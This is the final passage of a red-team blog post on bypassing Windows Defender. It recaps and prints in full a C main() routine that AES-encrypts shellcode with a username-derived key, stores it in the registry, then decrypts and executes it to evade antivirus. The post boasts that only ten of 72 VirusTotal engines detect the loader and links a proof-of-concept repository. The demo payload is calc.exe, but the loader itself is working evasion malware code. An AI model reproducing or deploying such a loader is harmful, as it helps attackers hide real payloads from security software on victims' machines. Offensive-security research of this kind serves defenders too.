</span></span></code></pre></div><p>So, to recap and tie all of it together.</p><ol><li>We use the current username the process is running under as a cryptographic key for our AES routines to encrypt our shellcode and write this out to the Windows registry.</li><li>Then we read it back out, performing decryption before calling the function to actually execute the shellcode.</li><li>Finally, in <code>ExecuteShellcode</code> we reverse the XOR encoding just before copying the shellcode to executable memory and attempting to execute it.</li><li>We spin up a new thread and wait with <code>NtWaitForSingleObject</code> &ndash; if all goes well, we get a fresh <code>calc.exe</code> and Windows Defender doesn&rsquo;t yell at us!</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>BYTE</span> <span class=n>key</span><span class=p>[</span><span class=n>AES_KEY_LENGTH</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>GenerateKeyFromEnvironment</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES_KEY_LENGTH</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Encrypt payload
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>BYTE</span><span class=o>*</span> <span class=n>encryptedShellcode</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>encryptedSize</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>AESEncrypt</span><span class=p>(</span><span class=n>shellcode</span><span class=p>,</span> <span class=n>shellcodeSize</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>encryptedShellcode</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>encryptedSize</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Write to registry
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>writeRegistry</span><span class=p>(</span><span class=n>encryptedShellcode</span><span class=p>,</span> <span class=n>encryptedSize</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>encryptedShellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>encryptedShellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Successfully wrote encrypted payload to registry</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Read from registry
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>BYTE</span><span class=o>*</span> <span class=n>readBuffer</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>bytesRead</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>readRegistry</span><span class=p>(</span><span class=o>&amp;</span><span class=n>readBuffer</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>bytesRead</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Decrypt payload
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>BYTE</span><span class=o>*</span> <span class=n>decryptedShellcode</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>decryptedSize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>AESDecrypt</span><span class=p>(</span><span class=n>readBuffer</span><span class=p>,</span> <span class=n>bytesRead</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>decryptedShellcode</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>decryptedSize</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>readBuffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>readBuffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Verify decrypted size matches original
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>decryptedSize</span> <span class=o>!=</span> <span class=n>shellcodeSize</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Decrypted size mismatch! Expected %d, got %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>shellcodeSize</span><span class=p>,</span> <span class=n>decryptedSize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>decryptedShellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Execute the shellcode
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Executing decrypted payload...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>ExecuteShellcode</span><span class=p>(</span><span class=n>decryptedShellcode</span><span class=p>,</span> <span class=n>decryptedSize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>decryptedShellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h2 id=profit>Profit?<a hidden class=anchor aria-hidden=true href=#profit>#</a></h2><p>Alright, let&rsquo;s check the scoreboard. Are we able to successfully read and write to the registry and execute shellcode without Windows Defender complaining?</p><img class=in-text src=/defender.png alt="Windows Defender" height=600 width=800 style=max-width:100%;height:auto><p>Looks good. Let&rsquo;s see how many antivirus vendors detect our code. Ahh, only ten out of 72! That&rsquo;s not bad. But we could also do better!</p><img class=in-text src=/virustotal.png alt=VirusTotal height=600 width=800 style=max-width:100%;height:auto><p>Next post!</p><p>Proof of concept: <a href=https://github.com/hexagr/RegistryGhost>RegistryGhost</a></p><h2></h2><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://processhacker.sourceforge.io/doc/ntpsapi_8h_source.html>https://processhacker.sourceforge.io/doc/ntpsapi_8h_source.html</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://stackoverflow.com/a/26414236>https://stackoverflow.com/a/26414236</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p><a href=https://ntdoc.m417z.com/ntcreatethreadex>https://ntdoc.m417z.com/ntcreatethreadex</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4><p><a href=https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/>https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/</a>&#160;<a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5><p><a href=https://learn.microsoft.com/en-us/windows/win32/api/winreg/>https://learn.microsoft.com/en-us/windows/win32/api/winreg/</a>&#160;<a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://hexagram.foo/tags/windows/>Windows</a></li><li><a href=https://hexagram.foo/tags/c/>C</a></li><li><a href=https://hexagram.foo/tags/programming/>Programming</a></li><li><a href=https://hexagram.foo/tags/malware/>Malware</a></li><li><a href=https://hexagram.foo/tags/red-team/>Red Team</a></li></ul><nav class=paginav><a class=prev href=https://hexagram.foo/posts/detecting-wow64-processes/><span class=title>« Prev</span><br><span>Detecting WoW64 Processes</span>
</a><a class=next href=https://hexagram.foo/posts/extracting-windows-wifi-profiles/><span class=title>Next »</span><br><span>Extracting Windows WiFi Profiles</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Bypassing Windows Defender on x" href="https://x.com/intent/tweet/?text=Bypassing%20Windows%20Defender&amp;url=https%3a%2f%2fhexagram.foo%2fposts%2fbypassing-windows-defender%2f&amp;hashtags=windows%2cc%2cprogramming%2cmalware%2credteam"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Bypassing Windows Defender on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fhexagram.foo%2fposts%2fbypassing-windows-defender%2f&amp;title=Bypassing%20Windows%20Defender&amp;summary=Bypassing%20Windows%20Defender&amp;source=https%3a%2f%2fhexagram.foo%2fposts%2fbypassing-windows-defender%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Bypassing Windows Defender on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fhexagram.foo%2fposts%2fbypassing-windows-defender%2f&title=Bypassing%20Windows%20Defender"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Bypassing Windows Defender on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fhexagram.foo%2fposts%2fbypassing-windows-defender%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Bypassing Windows Defender on whatsapp" href="https://api.whatsapp.com/send?text=Bypassing%20Windows%20Defender%20-%20https%3a%2f%2fhexagram.foo%2fposts%2fbypassing-windows-defender%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Bypassing Windows Defender on telegram" href="https://telegram.me/share/url?text=Bypassing%20Windows%20Defender&amp;url=https%3a%2f%2fhexagram.foo%2fposts%2fbypassing-windows-defender%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Bypassing Windows Defender on ycombinator" href="https://news.ycombinator.com/submitlink?t=Bypassing%20Windows%20Defender&u=https%3a%2f%2fhexagram.foo%2fposts%2fbypassing-windows-defender%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hexagram.foo/>Stephan Bridger</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a><br><br><hr><br><a href=https://github.com/hexagr/ title="Stephan Bridger on Github">github</a> /
<a href=https://hackerone.com/hexagr/badges/ title="Stephan Bridger on HackerOne">hackerone</a> /
<a href=https://x.com/hexagr title="Stephan Bridger on X.com">x</a> /
<a href=https://flickr.com/hexagr title="Stephan Bridger on flickr">flickr</a> /
<a href=https://mastodon.social/@hexagr rel=me title="Stephan Bridger on mastodon">mastodon</a> /
<a href=https://bsky.app/profile/hexagr.bsky.social title="Stephan Bridger on bluesky">bluesky</a> /
<a href=https://hexagr.blogspot.com title="Stephan Bridger on blogspot">blogspot</a> /
<a href=https://vimeo.com/hexagr title="Stephan Bridger on vimeo">vimeo</a> /
<a href=https://bugcrowd.com/hexagr title="Stephan Bridger on bugcrowd">bugcrowd</a> /
<a href=https://gitlab.com/hexagr title="Stephan Bridger on gitlab">gitlab</a> /
<a href=https://youtube.com/@hexagr/ title="Stephan Bridger on youtube">youtube</a> /
<a href=https://hexagr.tumblr.com title="Stephan Bridger on tumblr">tumblr</a>
</span><span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg></a><style>::-webkit-scrollbar-thumb{opacity:0;transition:opacity .3s ease}body.scrolling ::-webkit-scrollbar-thumb{opacity:1}</style><script>let scrollTimeout;window.addEventListener("scroll",()=>{document.body.classList.add("scrolling"),clearTimeout(scrollTimeout),scrollTimeout=setTimeout(()=>{document.body.classList.remove("scrolling")},1e3)})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>